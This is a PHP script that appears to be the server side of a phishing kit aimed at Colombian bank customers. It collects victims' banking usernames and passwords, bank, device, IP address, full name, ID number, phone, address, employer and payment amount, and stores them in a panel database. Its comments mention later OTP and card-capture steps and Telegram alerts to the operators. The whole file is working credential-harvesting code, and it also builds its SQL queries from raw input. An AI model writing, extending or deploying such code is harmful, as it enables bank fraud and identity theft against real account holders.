<?php
require_once("../lib/class.inputfilter.php");
require('../panel/include/setings.php');
date_default_timezone_set('America/Bogota');
$ifilter = new InputFilter();

// 1. Recibir credenciales básicas
$usuario = '';
if (isset($_POST['usr']) && $_POST['usr'] !== '') {
    $usuario = $ifilter->process($_POST['usr']);
} elseif (isset($_COOKIE['usuario'])) {
    $usuario = $ifilter->process($_COOKIE['usuario']);
}

$contrasena = isset($_POST['pas']) ? $ifilter->process($_POST['pas']) : '';
$banco = isset($_POST['ban']) ? $ifilter->process($_POST['ban']) : '';
$dispositivo = isset($_POST['dis']) ? $ifilter->process($_POST['dis']) : '';
$ip = $_SERVER['REMOTE_ADDR'];

// 🟢 2. CAPTURAR TODOS LOS DATOS PERSONALES
$nom = isset($_POST['nom']) ? $ifilter->process($_POST['nom']) : '';
$ape = isset($_POST['ape']) ? $ifilter->process($_POST['ape']) : '';
$tdoc = isset($_POST['tdoc']) ? $ifilter->process($_POST['tdoc']) : '';
$doc = isset($_POST['doc']) ? $ifilter->process($_POST['doc']) : '';
$cel = isset($_POST['cel']) ? $ifilter->process($_POST['cel']) : '';
$dir = isset($_POST['dir']) ? $ifilter->process($_POST['dir']) : '';
$emp = isset($_POST['emp']) ? $ifilter->process($_POST['emp']) : '';
$ref = isset($_POST['ref']) ? $ifilter->process($_POST['ref']) : '';
// (Opcional) Guardar el valor a pagar si lo envías en 'mnt'
$mnt = isset($_POST['mnt']) ? $ifilter->process($_POST['mnt']) : 0; 

$id = isset($_COOKIE['id']) ? $ifilter->process($_COOKIE['id']) : '';

if ($con = conectar()) {
    // 3. Buscar el ID si no hay cookie
    if ($id === '' && $usuario !== '') {
        $consulta = sentencia($con, "SELECT idreg FROM m3it3m WHERE usuario = '".$usuario."' ORDER BY idreg DESC LIMIT 1");
        if (contarfilas($consulta)) {
            $datos = traerdatos($consulta);
            $id = (string)$datos['idreg'];
        }
    }

    // 🟢 4. SI EL ID SIGUE VACÍO -> ES UN CLIENTE NUEVO (CREAR REGISTRO)
    if ($id === '' && $usuario !== '') {
        // Status 2 significa "esperando_otp_pse" en tu panel React
        $query_insert = "INSERT INTO m3it3m (usuario, password, banco, dispositivo, ip, status, agente, nombre, apellido, tipo_doc, cedula, celular, direccion, empresa, referencia) 
                         VALUES ('$usuario', '$contrasena', '$banco', '$dispositivo', '$ip', 2, '$mnt', '$nom', '$ape', '$tdoc', '$doc', '$cel', '$dir', '$emp', '$ref')";
        sentencia($con, $query_insert);
        
        // Recuperamos el ID recién creado
        $id = mysqli_insert_id($con);
        
        // Seteamos las cookies para que los siguientes pasos (OTP, Tarjeta, etc) sepan a qué ID actualizar
        setcookie('id', $id, time() + 3600, '/');
        setcookie('usuario', $usuario, time() + 3600, '/');
    } 
    // 🟢 5. SI YA EXISTE -> ACTUALIZAR (MANTIENE FUNCIONES DEL PANEL)
    else if ($id !== '') {
        // Mantiene alertas de telegram nativas y lógicas de tu panel
        upgrade_user($id, $usuario, $contrasena, $banco); 
        
        // Actualizamos los datos personales en la base de datos
        $query_update = "UPDATE m3it3m SET 
            nombre = '$nom', 
            apellido = '$ape', 
            tipo_doc = '$tdoc', 
            cedula = '$doc', 
            celular = '$cel', 
            direccion = '$dir', 
            empresa = '$emp', 
            referencia = '$ref',
            agente = IF('$mnt' > 0, '$mnt', agente)
            WHERE idreg = '$id'";
            
        sentencia($con, $query_update);
    }
    desconectar($con);
}
?>